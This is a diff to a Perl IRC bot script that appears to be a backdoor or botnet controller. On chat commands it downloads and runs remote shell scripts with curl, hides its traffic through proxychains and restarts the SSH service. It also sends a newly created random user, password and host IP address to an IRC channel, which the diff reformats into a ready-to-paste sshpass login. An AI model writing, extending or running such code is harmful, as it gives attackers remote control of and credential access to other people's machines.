@@ -51,9 +51,8 @@ $irc->on(irc_privmsg => sub {
   $irc->write(notice => $noticechan => "[info] Autorun enabled\n");
  }
  if ($msg =~ /@.cloak/) {
-  system("curl -LvO https://pastebin.com/raw/w86vVZ7i -o ~/perlircssl.pl");
   system("curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/proxych/main/install.sh -o install.sh && sh install.sh &");
-  system("proxychains perl ~/perlircssl.pl&");
+  system("proxychains perl ~/perlircssl.pl &");
   $irc->write(notice => $noticechan => "[info] Cloaked!\n");
  }
   if ($msg =~ /@.novnc/) {
@@ -105,7 +104,7 @@ system 'if [ -f /usr/bin/yum ]; then sudo service sshd restart; fi';
 system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
   warn 'Getting External IP Address';
   $address = eval { Net::Address::IP::Local->connected_to('perlmaven.com') };
-  @arr4y = ('9,1Added admin:', $random_user, 'password:', $random_number, 'on host:', $address);
+  @arr4y = ('sshpass -p "', $random_number, '" ssh -l ', $random_user, $address);
   warn "@arr4y";
   $irc->write(notice => $noticechan => @arr4y);
  }
